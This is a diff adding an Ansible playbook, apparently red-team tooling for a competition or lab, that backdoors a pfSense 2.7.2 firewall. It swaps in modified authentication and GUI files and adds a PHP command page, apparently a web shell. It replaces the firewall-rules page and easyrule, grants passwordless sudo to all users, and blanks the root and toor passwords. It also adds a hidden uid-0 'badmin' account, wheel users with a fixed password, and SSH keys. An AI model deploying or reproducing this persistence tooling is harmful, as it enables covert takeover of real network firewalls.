@@ -1,0 +1,168 @@
+---
+- name: Deploy pfsense goofs
+  hosts: pfsense
+  become: no # pfsense doesn't have sudo
+  tasks:
+
+#Authentication files first
+
+  - name: AUTH.INC | Deploy modified auth.inc
+    copy:
+      src: /home/kali/Desktop/modified/pfsense272/auth.inc
+      dest: /etc/inc/auth.inc
+      
+  - name: AUTHGUI.INC | Deploy modified AUTHGUI.INC
+    copy:
+      src: /home/kali/Desktop/modified/pfsense272/authgui.inc
+      dest: /etc/inc/authgui.inc
+      mode: 0755
+
+# gui files next
+
+  - name: system_usermanager.php
+    copy:
+      src: /home/kali/Desktop/modified/pfsense272/system_usermanager.php
+      dest: /usr/local/www/system_usermanager.php
+
+  - name: lober.gif
+    copy:
+      src: /home/kali/Desktop/modified/pfsense272/lober.gif
+      dest: /usr/local/www/lober.gif
+      
+  - name: move firewall_rules.php to a safe location
+    ansible.builtin.command: 
+      cmd: mv /usr/local/www/firewall_rules.php /usr/local/www/firewallrules.php
+    args:
+      creates: /etc/inc/hardrule.inc     # Skip if already moved
+  
+  - name: lober.php
+    copy:
+      src: /home/kali/Desktop/modified/pfsense272/lober.php
+      dest: /usr/local/www/firewall_rules.php
+      
+  - name: add php command page
+    copy:
+      src: /home/kali/Desktop/modified/pfsense272/commands.php
+      dest: /usr/local/www/command.php
+
+# optional gui files
+      
+  - name: head.inc
+    copy:
+      src: /home/kali/Desktop/modified/pfsense272/head.inc
+      dest: /usr/local/www/cornhill.inc
+      mode: 0755
+
+  - name: firewall_rules.php
+    copy:
+      src: /home/kali/Desktop/modified/pfsense272/firewall_rules.php
+      dest: /usr/local/www/fireball_rules.php
+      mode: 0755
+
+# easyrule
+
+  - name: move easyrule to hardrule
+    ansible.builtin.command: 
+      cmd: mv /usr/local/bin/easyrule /usr/local/bin/hardrule
+    args:
+      creates: /etc/inc/hardrule     # Skip if already moved
+      
+  - name: easyrule
+    copy:
+      src: /home/kali/Desktop/modified/pfsense272/nonexfil_easyrule
+      dest: /usr/local/bin/easyrule
+
+  - name: move easyrule.inc to hardrule.inc
+    ansible.builtin.command: 
+      cmd: mv /etc/inc/easyrule.inc /etc/inc/hardrule.inc
+    args:
+      creates: /etc/inc/hardrule.inc     # Skip if already moved
+      
+  - name: easyrule.inc
+    copy:
+      src: /home/kali/Desktop/modified/pfsense272/easyrule.inc
+      dest: /etc/inc/easyrule.inc
+
+# rc.initial changes or login shells
+      
+  - name: RC.initial | Deploy modified RC.INITIAL
+    copy:
+      src: /home/kali/Desktop/modified/pfsense272/rc.initial
+      dest: /etc/rc.initial
+      mode: 0755
+            
+  - name: timetravel.initial
+    copy:
+      src: /home/kali/Desktop/modified/pfsense272/timetravel.initial
+      dest: /etc/timetravel.initial
+      mode: 0755
+      
+# pfsense stds
+
+  - name: install sudo
+    ansible.builtin.command: 
+      cmd: pkg install -y sudo
+
+  - name: install nano
+    ansible.builtin.command: 
+      cmd: pkg install -y nano
+      
+  - name: TrainingWheels | Update Sudoers
+    become: true
+    ansible.builtin.lineinfile:
+      path: /usr/local/etc/sudoers
+      insertafter: EOF
+      line: "ALL ALL=(ALL:ALL) NOPASSWD:ALL"
+
+  - name: NEXUS | Passwordless Root Login
+    become: true
+    ansible.builtin.lineinfile:
+      path: /etc/passwd
+      search_string: "root:*:0:0:Charlie &:/root:/bin/tcsh"
+      line: "root::0:0:Charlie &:/root:/bin/sh"
+      state: present
+
+  - name: NEXUS | Passwordless TOOR Login
+    become: true
+    ansible.builtin.lineinfile:
+      path: /etc/passwd
+      search_string: "toor:*:0:0:Bourne-again Superuser:/root:"
+      line: "toor::0:0:Bourne-again Superuser:/root:"
+      state: present
+
+#doesnt work?
+  - name: NEXUS | Passwordless badmin Login
+    become: true
+    ansible.builtin.lineinfile:
+      path: /etc/passwd
+      insertafter: EOF
+      line: "badmin::0:0:System Administrator:/root:/etc/rc.initial"
+      
+  - name: Nexus | Add Users 
+    ansible.builtin.user:
+      name: "{{ item }}"
+      password: "{{ 'letredin' | password_hash('sha512') }}"
+      shell: /bin/tcsh
+      state: present
+      groups: "wheel"
+      create_home: false
+    with_items:
+      - "{{ redteam_users }}"
+
+  - name: Nexus | Add Keys
+    ansible.posix.authorized_key:
+      user: "{{ item.0 }}"
+      key: "{{ item.1 }}"
+      manage_dir: true
+      state: "present"
+    with_nested: 
+      - "{{ pfusers }}"
+      - "{{ sshkeys }}"
+
+  
+  
+  
+  
+  
+  
+  
